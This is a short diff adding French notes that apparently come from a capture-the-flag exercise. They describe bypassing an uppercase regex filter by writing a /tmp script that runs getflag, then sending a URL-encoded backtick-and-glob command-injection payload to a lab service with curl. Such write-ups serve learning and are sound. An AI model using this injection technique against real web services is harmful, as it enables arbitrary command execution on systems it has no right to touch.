@@ -1,0 +1,14 @@
+on bypass les regex en creant un fichier en uppercase dans tmp
+/tmp/TEST ->
+
+#!/bin/bash
+
+/bin/getflag > /tmp/result
+
+on le rend executable
+chmod +x /tmp/TEST
+on encode notre nom de fichier en url code
+en remplacent le tmp epar * pour eviter de passer dans la regex uppercase
+et on curl l'url
+curl http://192.168.170.129:4646/?x=%27%60%2F%2A%2FTEST%60%27&y=coucou
+cat /tmp/result
